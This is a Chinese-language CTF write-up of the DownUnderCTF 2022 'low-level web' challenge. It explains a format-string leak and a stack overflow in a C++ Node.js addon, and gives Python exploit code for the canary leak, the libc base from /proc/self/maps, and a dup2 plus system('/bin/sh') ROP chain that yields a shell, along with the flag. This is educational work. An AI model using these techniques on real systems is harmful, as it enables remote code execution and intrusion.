# DownUnderCTF 2022 low-level web Writeup

## 题目简述

目标是一个 Express Web 应用，但 Base64/hex 转换由 C++ Node.js addon 完成。决定性漏洞是 native addon 中的格式化字符串和栈溢出，因此应归入 Pwn，而不是仅因入口是 HTTP 就归 Web。

应用暴露三个关键接口：`/hex_to_base64`、`/base64_to_hex` 和直接返回 `/proc/self/maps` 的 `/debug`。远端 HTTP 连接对应进程文件描述符 19。

## 解题过程

### 用格式化字符串泄漏 canary

hex 解码函数存在：

```cpp
void hex_to_bytes(std::string buf, char* out, size_t len) {
    char tmp[1000];
    /* 把 hex 解码到 tmp */
    snprintf(out, len / 2 + 1, tmp);
}
```

`tmp` 完全由用户控制，却被当作 `snprintf` 的 format。HTTP 层不允许 `%`，但接口接收的是 hex 字符串，所以可把 `[%21$lx]` 等格式串编码成 hex 后提交。响应会把格式化结果再次编码为 Base64，解码即可读取栈值。

连续探测参数位置，寻找 16 位十六进制且最低字节为 `00` 的值，即可定位栈 canary：

```python
def leak_slot(i):
    raw = f'[%{i}$lx]'.encode() + b' ' * 20
    r = requests.post(URL + '/hex_to_base64', json={'data': raw.hex()}).json()
    return b64decode(r['data']).split(b'[')[1].split(b']')[0]

for i in range(21, 100):
    value = leak_slot(i)
    if len(value) == 16 and value.endswith(b'00'):
        canary = int(value, 16)
        break
```

### 从 debug 映射取得 libc 基址

访问 `/debug` 可直接读取进程内存映射。找到随题提供的 `libc-2.31.so` 对应、文件偏移为 0 的映射行，其起始地址就是 libc 基址。这样无需再构造 libc 函数泄漏。

### 利用 `bytes_to_hex` 栈溢出

Base64 解码后的数据会传入：

```cpp
std::string bytes_to_hex(char* buf, size_t len) {
    char tmp[500];
    memcpy(tmp, buf, len);
    /* ... */
}
```

接口只限制编码字符串小于 1000 字符，解码后仍可超过 500 字节。官方布局中，504 字节填充到 canary，canary 后再填充 56 字节到保存返回地址。ROP 先把 fd 19 复制到标准输入、输出和错误，再执行 `system("/bin/sh")`：

```python
rop = ROP(libc)
rop.call(libc.sym['dup2'], [19, 0])
rop.call(libc.sym['dup2'], [19, 1])
rop.call(libc.sym['dup2'], [19, 2])
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\0'))])

raw = b'A' * 504 + p64(canary) + b'B' * 56 + rop.chain()
body = json.dumps({'data': b64encode(raw).decode()})
```

要在同一个 TCP 连接上手工发送 `POST /base64_to_hex`，随后直接与已重定向到该连接的 shell 交互。读取 `/flag.txt` 得到：

```text
DUCTF{Gu3SS_wh4Ts_N0_l0ng3R_M3m0Ry_s4fE?_5d2f45d7ef0e1ba4ecda7489ddf5d8a8}
```

## 方法总结

Web 框架的输入校验无法自动保护 native addon。这里 hex 编码绕过了 `%` 字符过滤，格式化字符串泄漏 canary；调试接口泄漏 libc；另一路转换再提供栈溢出。取得 shell 后还必须把正确的 HTTP socket fd 复制到 0、1、2，否则进程虽然执行了 `/bin/sh`，客户端也无法交互。
